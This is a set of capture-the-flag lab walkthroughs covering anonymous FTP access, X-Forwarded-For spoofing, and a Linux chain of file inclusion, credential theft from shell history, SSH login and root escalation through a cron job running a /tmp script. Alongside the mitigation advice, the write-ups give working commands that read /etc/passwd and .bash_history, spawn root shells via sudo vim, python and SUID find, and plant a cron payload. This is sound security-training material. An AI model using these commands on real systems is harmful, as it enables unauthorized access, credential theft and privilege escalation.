# HackDNA – FTP Anonymous Access Lab

## Challenge Overview

This lab demonstrates a common misconfiguration in FTP services where anonymous authentication is enabled. When improperly configured, attackers can access sensitive files without valid credentials.

FTP servers with anonymous access often expose internal files, backups, or flags in CTF environments.

---

## Objective

Connect to the FTP service using anonymous credentials and retrieve the hidden flag file.

---

# Understanding the Vulnerability

Anonymous FTP login allows users to access a server without a personal account.

If write or read permissions are misconfigured, attackers may:

* Download sensitive files
* Upload malicious content
* Enumerate directory structure
* Extract configuration data

---

# Reconnaissance

Identify that FTP service is available on the target IP:

```bash 
34.245.169.217

```

Standard FTP port:

```
21/tcp
```

---

# Exploitation

Use `curl` to access the FTP server anonymously.

## Command

```bash
curl ftp://34.245.169.217/flag.txt --user anonymous: anonymous
```

---

# Result

The server returns the contents of the file:

```
358e3bff-6398-414f-b72b-e9cca1d5cbb7
```

This represents the retrieved flag from the FTP service.

---

# Alternative FTP Access

Using interactive FTP client:

```bash
ftp 34.245.169.217
```

Login credentials:

```text
Username: anonymous
Password: anonymous
```

Then list files:

```bash
ls
```

Download flag:

```bash
get flag.txt
```

---

# Impact

If anonymous FTP is enabled in production environments, attackers may:

* Access sensitive internal files
* Download configuration backups
* Retrieve credentials
* Upload malicious payloads
* Pivot into internal networks

---

# Root Cause

This vulnerability occurs due to:

* Enabled anonymous FTP login
* Weak access control configuration
* Improper file permission settings
* Lack of service hardening

---

# Detection Techniques

## Port Scanning

```bash

nmap -p 21 34.245.169.217

```

## FTP Banner Checking

```bash
nc 34.245.169.217 21
```

Look for banners indicating FTP service version.

---

# Mitigation

## Disable Anonymous Login

Ensure FTP servers do not allow unauthenticated access.

---

## Restrict File Permissions

Only authorized users should access sensitive directories.

---

## Use Secure Alternatives

Replace FTP with:

* SFTP (SSH File Transfer Protocol)
* FTPS (FTP Secure)

---

## Network Segmentation

Isolate file transfer services from public networks.

---

# Key Takeaway

Anonymous FTP access is a critical misconfiguration that can lead to unauthorized data exposure.

Any publicly accessible FTP service must be properly secured and authenticated.

---

# Vulnerability Classification

* CWE-306: Missing Authentication for Critical Function
* CWE-284: Improper Access Control
* OWASP A05:2021 – Security Misconfiguration

---

# Conclusion

This lab demonstrates how a simple misconfiguration in FTP services can expose sensitive files to attackers. Proper authentication and secure service configuration are essential to prevent unauthorized access.

---


# HackDNA – Spoofed Header Access (X-Forwarded-For)

## Challenge Overview

This lab demonstrates how trusting client-supplied HTTP headers can lead to access control bypasses. In particular, the `X-Forwarded-For` header is sometimes incorrectly used for security decisions such as IP-based filtering, admin gating, or hidden route exposure.

When applications trust this header without proper validation, attackers can spoof it to manipulate server-side logic.

---

# Objective

Bypass access restrictions by manipulating HTTP headers and retrieve the hidden flag endpoint.

---

# Understanding the Vulnerability

The `X-Forwarded-For` header is intended to represent the original client IP when requests pass through proxies or load balancers.

However, if the application directly trusts this value:

* IP-based restrictions can be bypassed
* Admin panels may be exposed
* Hidden endpoints may be revealed
* Security logic can be manipulated

---

# Reconnaissance

A POST request is made to the application:

```bash
http://3.252.233.93/index.php
```

The request includes a custom header:

```http
X-Forwarded-For: 3.252.233.93
```

This is used to influence server-side logic.

---

# Exploitation

## Curl Request

```bash
curl -X POST http://3.252.233.93/index.php \
  -H "X-Forwarded-For: 3.252.233.93" \
  -d "password=" -v
```

---

## Server Response

The server responds with a redirect:

```http
HTTP/1.1 302 Found
Location: /2kf84qoqi6sviu7poeu54p9b/flag.txt
```

This indicates successful bypass of the access control logic.

---

# Flag Retrieval

Follow the redirected path:

```
/2kf84qoqi6sviu7poeu54p9b/flag.txt
```

Retrieve the flag using curl:

```bash
curl http://3.252.233.93/2kf84qoqi6sviu7poeu54p9b/flag.txt

```
> Get the flag :  5bdd59d4-2ab4-4a30-af10-534e35e7065d

---

# Impact

If applications trust spoofable headers, attackers can:

* Bypass IP restrictions
* Access hidden administrative routes
* Evade geo-blocking controls
* Manipulate security rules
* Reach sensitive internal endpoints

---

# Root Cause

This vulnerability occurs because:

* Server trusts `X-Forwarded-For` without validation
* No reverse proxy normalization is enforced
* Client-controlled headers are used for security decisions
* Lack of secure IP resolution logic

---

# Detection Techniques

## Manual Testing

* Modify `X-Forwarded-For` header
* Observe changes in application behavior
* Test different IP values (localhost, private ranges)

## Example Variations

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.1.1

```

---

# Security Impact

Exploiting spoofed headers can lead to:

* Authentication bypass
* Hidden endpoint discovery
* Privilege escalation
* Internal system exposure
* Administrative access

---

# Defensive Measures

## Do Not Trust Client Headers

Never use `X-Forwarded-For` for security decisions without validation.

---

## Use Trusted Reverse Proxies

Only accept IP headers from known proxy infrastructure.

---

## Validate Source IP Server-Side

Use server-obtained connection IP instead of headers.

---

## Normalize Headers

Strip or overwrite incoming spoofable headers at the proxy layer.

---

## Implement Access Controls Properly

Security decisions should rely on:

* Authentication tokens
* Session validation
* Server-side authorization logic

---

# Key Takeaway

Client-controlled HTTP headers are not trustworthy.

Security-critical decisions must never rely on values that originate from the client.

---

# Vulnerability Classification

* CWE-290: Authentication Bypass by Spoofing
* CWE-346: Origin Validation Error
* CWE-807: Reliance on Untrusted Inputs in a Security Decision
* OWASP A01:2021 – Broken Access Control

---

# Conclusion

This lab demonstrates how simple header spoofing can bypass weak server-side trust assumptions. Misuse of `X-Forwarded-For` is a common real-world issue in misconfigured proxy and load-balanced environments.

Proper IP validation and strict trust boundaries are essential to prevent this class of vulnerability.


``` bash

curl -X POST http://3.252.233.93/index.php -H "X-Forwarded-For: 3.252.233.93" -d "password=" -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 3.252.233.93:80...
* Established connection to 3.252.233.93 (3.252.233.93 port 80) from 192.168.100.91 port 59102 
* using HTTP/1.x
> POST /index.php HTTP/1.1
> Host: 3.252.233.93
> User-Agent: curl/8.18.0
> Accept: */*
> X-Forwarded-For: 3.252.233.93
> Content-Length: 9
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 9 bytes
< HTTP/1.1 302 Found
< Date: Thu, 21 May 2026 18:55:01 GMT
< Server: Apache/2.4.57 (Debian)
< X-Powered-By: PHP/8.3.4
< Location: /2kf84qoqi6sviu7poeu54p9b/flag.txt
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 3.252.233.93:80 left intact


```

---

# Cronpocalypse — Linux Privilege Escalation Walkthrough

## Overview

The Cronpocalypse lab is an easy-level Linux privilege escalation challenge focused on:

- Local File Inclusion (LFI)
- Credential discovery
- SSH access
- Misconfigured cron jobs
- SUID privilege escalation

Goal:

- Retrieve `flag-user.txt`
- Retrieve `flag-root.txt`

---

# Step 1 — Exploit Local File Inclusion (LFI)

The target web application exposes a vulnerable file-reading endpoint.

## Test for LFI

Try:

```bash
curl "http://<TARGET_IP>/read?file=/etc/passwd"
```

If `file` does not work, try common alternatives:

```text
path
filename
page
doc
```

Example:

```bash
curl "http://<TARGET_IP>/read?page=/etc/passwd"
```

---

## Identify Valid Users

Look for users with interactive shells:

```text
ctf:x:1001:1001::/home/ctf:/bin/bash
```

The important fields are:

- Username: `ctf`
- Home directory: `/home/ctf`
- Shell: `/bin/bash`

---

# Step 2 — Retrieve Credentials

Read the shell history file:

```bash
curl "http://<TARGET_IP>/read?file=/home/ctf/.bash_history"
```

Look for:

- SSH logins
- `su` commands
- MySQL credentials
- Hardcoded passwords

Example:

```text
ssh ctf@localhost
su -
Password: s3cr3tpassword123
```

Or:

```text
mysql -u root -pSuperSecretPassword
```

---

# Step 3 — SSH Access

Use the discovered credentials:

```bash
ssh ctf@<TARGET_IP>
```

Enter the recovered password.

---

# Step 4 — Retrieve User Flag

Once logged in:

```bash
cat ~/flag-user.txt
```

Example output:

```text
flag{user_flag_here}
```

---

# Step 5 — Enumerate for Privilege Escalation

## Check Sudo Permissions

```bash
sudo -l
```

Look for commands runnable as root.

Example:

```text
(root) NOPASSWD: /usr/bin/find
```

---

## Check SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Interesting binaries include:

```text
/usr/bin/find
/usr/bin/vim
/usr/bin/python3
```

---

## Check Cron Jobs

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron*
```

```bash
crontab -l
```

---

## Search for Writable Files

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

Check especially for:

- Writable scripts
- Root-owned cron scripts
- Files executed automatically

---

# Step 6 — Exploitation

---

## Method 1 — Exploit SUID `find`

If `find` is SUID:

```bash
find /tmp -exec /bin/sh \; -quit
```

Verify root:

```bash
whoami
```

Expected:

```text
root
```

---

## Method 2 — Exploit Writable Cron Script

Suppose root runs:

```text
/opt/cleanup.sh
```

Check permissions:

```bash
ls -la /opt/cleanup.sh
```

If writable:

```bash
echo 'cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt' >> /opt/cleanup.sh
```

Wait approximately one minute for cron execution.

Retrieve the flag:

```bash
cat /tmp/flag-root.txt
```

---

## Method 3 — Exploit `sudo`

### Vim

```bash
sudo vim -c ':!/bin/sh'
```

---

### Python

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

---

### Less

```bash
sudo less /etc/passwd
```

Then type:

```text
!sh
```

---

# Step 7 — Retrieve Root Flag

Once root access is obtained:

```bash
cat /root/flag-root.txt
```

Example:

```text
flag{root_flag_here}
```

---

# Quick Reference Table

| Step | Command | Goal |
|---|---|---|
| LFI | `curl "http://IP/read?file=/etc/passwd"` | Identify users |
| Credentials | `curl "http://IP/read?file=/home/ctf/.bash_history"` | Recover passwords |
| SSH | `ssh ctf@IP` | Gain shell |
| User Flag | `cat ~/flag-user.txt` | Retrieve user flag |
| Enumeration | `sudo -l` | Identify sudo misconfigurations |
| Enumeration | `find / -perm -4000 -type f 2>/dev/null` | Find SUID binaries |
| Enumeration | `cat /etc/crontab` | Check cron jobs |
| Root Flag | `cat /root/flag-root.txt` | Retrieve root flag |

---

# Key Lessons

## Local File Inclusion (LFI)

Improper file path validation allows attackers to read arbitrary files.

Examples:

- `/etc/passwd`
- `.bash_history`
- configuration files
- SSH keys

---

## Credential Hygiene

Sensitive credentials should never appear in:

- shell history
- scripts
- plaintext files

---

# Cronpocalypse — Part 2: Cron Job Privilege Escalation

## Overview

After gaining SSH access as the `ctf` user and retrieving the user flag, the next phase involved identifying a privilege escalation vector through cron jobs.

The target system exposed:

- `crond` running as root
- a root cron job
- execution of a script from `/tmp`
- insecure trust of a world-writable directory

This resulted in full root compromise.

---

# Step 1 — Enumerate SUID Binaries

Check for SUID-enabled binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output:

```text
/usr/bin/crontab
/usr/bin/sudo
```

Notably:

- No SUID `find`
- No SUID shell binaries
- Presence of `crontab`
- Presence of active cron daemon

---

# Step 2 — Identify Running Processes

Monitor active processes:

```bash
watch -n 1 ps aux
```

Observed processes:

```text
PID   USER     TIME  COMMAND
1     root     0:00  python3 /opt/webapp/app.py
8     root     0:00  sshd: /usr/sbin/sshd -D
11    root     0:00  crond -b -L /var/log/cron.log
23    ctf      0:00  -sh
177   ctf      0:00  ps aux
```

Important discovery:

```text
crond -b -L /var/log/cron.log
```

This confirmed:

- cron daemon active
- root scheduled tasks likely present

---

# Step 3 — Enumerate Root Cron Jobs

Check root crontab:

```bash
cat /etc/crontabs/root
```

Output:

```text
* * * * * /bin/sh /opt/root_cron.sh
```

This means:

- root executes `/opt/root_cron.sh`
- execution occurs every minute

---

# Step 4 — Inspect the Root Cron Script

Read the script contents:

```bash
cat /opt/root_cron.sh
```

Output:

```bash
#!/bin/sh
/bin/sh /tmp/backup.sh
```

Critical finding:

```text
/tmp/backup.sh
```

The root cron job executes a script from `/tmp`.

---

# Why This Is Vulnerable

`/tmp` is normally world-writable:

```bash
ls -ld /tmp
```

Typical permissions:

```text
drwxrwxrwt
```

Meaning:

- any user can create files
- root trusts attacker-controlled content
- arbitrary command execution becomes possible

This is a classic insecure cron configuration vulnerability.

---

# Step 5 — Create Malicious Script

Create the payload:

```bash
echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
```

Make it executable:

```bash
chmod +x /tmp/backup.sh
```

---

# Step 6 — Wait for Cron Execution

The cron job runs every minute:

```text
* * * * *
```

Wait approximately 60 seconds.

Root automatically executes:

```bash
/bin/sh /tmp/backup.sh
```

---

# Step 7 — Retrieve Root Flag

Read the copied flag:

```bash
cat /tmp/flag-root.txt
```

Example:

```text
flag{root_compromise_success}
```

---

# Full Exploit Chain

## Initial Access

```bash
curl "http://TARGET/read?file=/home/ctf/.bash_history"
```

↓

Recovered credentials

↓

```bash
ssh ctf@TARGET
```

---

## Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

↓

```bash
cat /etc/crontabs/root
```

↓

```bash
cat /opt/root_cron.sh
```

---

## Privilege Escalation

```bash
echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
```

↓

Root executes attacker-controlled script

↓

Root flag obtained

---

# Security Issues Identified

## 1. Local File Inclusion (LFI)

Allowed arbitrary file reads:

- `/etc/passwd`
- `.bash_history`

---

## 2. Credential Exposure

Sensitive credentials stored in:

```text
.bash_history
```

---

## 3. Insecure Cron Job Design

Root cron trusted a script in:

```text
/tmp
```

This violates secure execution principles.

---

## 4. World-Writable Directory Abuse

Using `/tmp` for privileged execution enables:

- privilege escalation
- arbitrary code execution
- persistence mechanisms

---

# Defensive Recommendations

## Never Execute Scripts from `/tmp`

Bad:

```bash
/bin/sh /tmp/script.sh
```

Good:

```bash
/bin/sh /opt/scripts/script.sh
```

With strict permissions:

```bash
chmod 700 script.sh
chown root:root script.sh
```

---

## Restrict Writable Locations

Avoid executing privileged code from:

- `/tmp`
- `/dev/shm`
- user-controlled paths

---

## Audit Cron Jobs

Review:

```bash
/etc/crontab
/etc/cron.*
/var/spool/cron/
```

Ensure:

- scripts are root-owned
- scripts are not writable
- paths are absolute
- no user-controlled content exists

---

# Key Lessons

This lab demonstrates a complete Linux attack chain:

1. Web application vulnerability
2. Credential harvesting
3. SSH access
4. Cron misconfiguration
5. Root privilege escalation

The most critical flaw was:

```text
Root executing a script from a world-writable directory
```

This single design mistake allowed full system compromise.

## Least Privilege

Misconfigured:

- cron jobs
- SUID binaries
- sudo permissions

can lead directly to full system compromise.

---

# Useful Enumeration Commands

```bash
id
whoami
hostname
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
find / -writable -type f 2>/dev/null
```

---

# Conclusion

Cronpocalypse demonstrates how small Linux misconfigurations can chain together into full privilege escalation:

1. LFI exposure
2. Credential leakage
3. SSH access
4. Misconfigured privilege mechanisms
5. Root compromise

Understanding these attack paths is essential for both offensive security testing and defensive hardening.

---

## Part 3
# Cronpocalypse — Root Cron Exploitation (Corrected Walkthrough)

## Discovering the Root Cron Job

After enumerating cron tasks, the root crontab revealed:

```bash
cat /etc/crontabs/root
```

Output:

```text
* * * * * /bin/sh /opt/root_cron.sh
```

This indicated that root executed `/opt/root_cron.sh` every minute.

---

# Attempting Direct Modification

The first attempt was to append commands directly into the root-owned cron script:

```bash
echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" >> /opt/root_cron.sh
```

Result:

```text
/bin/sh: can't create /opt/root_cron.sh: Permission denied
```

This confirmed:

- the file was root-owned
- the `ctf` user lacked write permissions
- direct modification was not possible

---

# Inspecting the Cron Script

Reading the script contents:

```bash
cat /opt/root_cron.sh
```

Output:

```bash
#!/bin/sh
/bin/sh /tmp/backup.sh
```

Critical observation:

```text
/tmp/backup.sh
```

The root cron job executed a script from `/tmp`.

---

# Why This Is Dangerous

The `/tmp` directory is world-writable by design.

Typical permissions:

```text
drwxrwxrwt
```

This means:

- any user can create files
- root trusted attacker-controlled content
- arbitrary command execution became possible

This is a classic cron privilege escalation vulnerability.

---

# Creating the Malicious Script

A malicious payload was written into `/tmp/backup.sh`:

```bash
echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
```

Attempting to set executable permissions:

```bash
chmod +x /tmp/backup.sh
```

Result:

```text
chmod: /tmp/backup.sh: Operation not permitted
```

Attempting sudo:

```bash
sudo chmod +x /tmp/backup.sh
```

Output:

```text
ctf is not in the sudoers file.
This incident has been reported to the administrator.
```

Despite the permission issue, the cron job still executed the script because it was explicitly invoked with:

```bash
/bin/sh /tmp/backup.sh
```

Meaning:

- executable permissions were unnecessary
- the shell directly interpreted the file contents

---

# Retrieving the Root Flag

After waiting for the cron job to execute, the `/tmp` directory contained:

```bash
ls
```

Output:

```text
backup.sh
backup.tar.gz
cron.lAccPh
flag-root.txt
```

Reading the flag:

```bash
cat /tmp/flag-root.txt
```

Output:

```text
c6322974-f9e1-41e6-ef27-e407e30a6dcf
```

Root compromise was successful.

---

# Why the Exploit Worked Without `chmod +x`

The cron task used:

```bash
/bin/sh /tmp/backup.sh
```

This is different from executing:

```bash
/tmp/backup.sh
```

Because the script was passed directly into the shell interpreter, executable permissions were not required.

Equivalent behavior:

```bash
sh script.sh
```

The shell reads and executes the file contents directly.

---

# Exploit Chain Summary

## 1. Enumerate Cron

```bash
cat /etc/crontabs/root
```

↓

Discovered:

```text
* * * * * /bin/sh /opt/root_cron.sh
```

---

## 2. Inspect Root Script

```bash
cat /opt/root_cron.sh
```

↓

Discovered:

```bash
/bin/sh /tmp/backup.sh
```

---

## 3. Create Malicious Payload

```bash
echo "cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt" > /tmp/backup.sh
```

---

## 4. Wait for Cron Execution

Root automatically executed:

```bash
/bin/sh /tmp/backup.sh
```

---

## 5. Retrieve Root Flag

```bash
cat /tmp/flag-root.txt
```

---

# Security Lessons

## Never Execute Scripts from `/tmp`

Dangerous:

```bash
/bin/sh /tmp/script.sh
```

Safe alternative:

```bash
/bin/sh /opt/scripts/script.sh
```

with:

```bash
chmod 700 script.sh
chown root:root script.sh
```

---

## Avoid Trusting World-Writable Directories

Directories such as:

- `/tmp`
- `/dev/shm`
- user home directories

must never be trusted for privileged execution.

---

## Principle of Least Privilege

Root cron jobs should:

- execute only trusted files
- use absolute paths
- avoid writable locations
- validate ownership and permissions

---

# Key Takeaway

The core vulnerability was:

```text
Root executed attacker-controlled code from /tmp
```

This single design flaw allowed full root compromise without requiring:

- sudo access
- SUID abuse
- kernel exploits
- password cracking
```

